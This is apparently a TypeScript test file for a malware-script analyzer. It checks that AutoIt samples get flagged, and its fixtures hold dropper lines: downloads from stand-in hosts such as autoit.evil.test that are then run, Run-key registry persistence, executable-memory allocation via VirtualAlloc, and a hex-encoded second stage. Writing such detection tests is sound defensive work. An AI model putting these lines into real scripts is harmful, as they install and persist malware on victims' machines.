// AutoIt (plans/caca-e-formatos, item 5): o script que o desempacotador tira do executavel
// compilado. As regras proprias so valem nele, e o binario 0x... vira camada ou achado.
import assert from 'node:assert/strict';
import { test } from 'node:test';

import { analyzeScript } from '../../src/lib/script-analysis';

const names = (text: string, filename = 'script.au3') =>
  analyzeScript(Buffer.from(text), filename)?.findings.map((f) => f.name) ?? [];

test('AutoIt: reconhecido pela extensão e pelo conteúdo', () => {
  assert.equal(analyzeScript(Buffer.from('MsgBox(0, "a", "b")\r\n'), 'x.au3')?.language, 'autoit');
  assert.equal(
    analyzeScript(Buffer.from('#NoTrayIcon\r\n#include <File.au3>\r\nMsgBox(0, "a", "b")\r\n'))
      ?.language,
    'autoit',
  );
  assert.equal(
    analyzeScript(Buffer.from('Func Baixar($u)\r\n  Return 1\r\nEndFunc\r\n'))?.language,
    'autoit',
  );
});

test('AutoIt: download, execução, persistência e memória', () => {
  const found = names(
    [
      '#NoTrayIcon',
      'InetGet ( "http://autoit.evil.test/c.bin" , @TempDir & "\\c.exe" , 1 )',
      'Run ( @TempDir & "\\c.exe" )',
      'RegWrite ( "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" , "upd" , "REG_SZ" , @ScriptFullPath )',
      'Local $buf = DllStructCreate ( "byte[4096]" )',
      'DllCall ( "kernel32.dll" , "ptr" , "VirtualAlloc" , "ptr" , 0 , "ulong_ptr" , 4096 , "dword" , 4096 , "dword" , 64 )',
      'FileInstall ( "C:\\build\\carga.exe" , @TempDir & "\\carga.exe" )',
      'Local $s = BinaryToString ( $b )',
    ].join('\r\n'),
  );
  for (const name of [
    '#NoTrayIcon',
    'InetGet/InetRead',
    'Run/ShellExecute',
    'RegWrite na chave Run',
    'DllStructCreate("byte[...]")',
    'DllCall de memória executável',
    'FileInstall',
    'BinaryToString/_Crypt_DecryptData',
  ])
    assert.ok(found.includes(name), `${name} em ${found.join(', ')}`);
  const info = analyzeScript(
    Buffer.from('InetGet("http://autoit.evil.test/c.bin", "c.exe")\r\nRun("c.exe")'),
    'a.au3',
  );
  assert.equal(info?.risk, 'high');
  assert.deepEqual(info?.urls, ['http://autoit.evil.test/c.bin']);
});

test('AutoIt: as regras próprias não valem nas outras linguagens', () => {
  assert.deepEqual(names('Run("calc")\nInetGet("x")', 'a.js'), []);
  // O método de objeto (.Run) continua sendo a regra geral, e "$run(" é variável.
  assert.ok(!names('Local $x = $run ( 1 )').includes('Run/ShellExecute'));
});

test('AutoIt: binário 0x com PE vira achado; com texto, camada', () => {
  const pe = Buffer.alloc(128);
  pe.write('MZ');
  const withPe = analyzeScript(Buffer.from(`Local $b = "0x${pe.toString('hex')}"`), 'a.au3');
  assert.ok(withPe?.findings.some((f) => f.name === 'PE em binário 0x' && f.kind === 'execute'));
  assert.equal(withPe?.risk, 'medium');

  const inner = 'InetGet("http://segunda.evil.test/p", "p.exe") & Run("p.exe") ; '.repeat(2);
  const withText = analyzeScript(
    Buffer.from(`Local $b = BinaryToString("0x${Buffer.from(inner).toString('hex')}")`),
    'a.au3',
  );
  const layer = withText?.layers.find((l) => l.method === 'Binário 0x (AutoIt)');
  assert.ok(layer?.text.includes('segunda.evil.test'), JSON.stringify(withText?.layers));
  assert.ok(withText?.urls.includes('http://segunda.evil.test/p'));
  assert.equal(withText?.findings.find((f) => f.name === 'InetGet/InetRead')?.layer, 1);
});
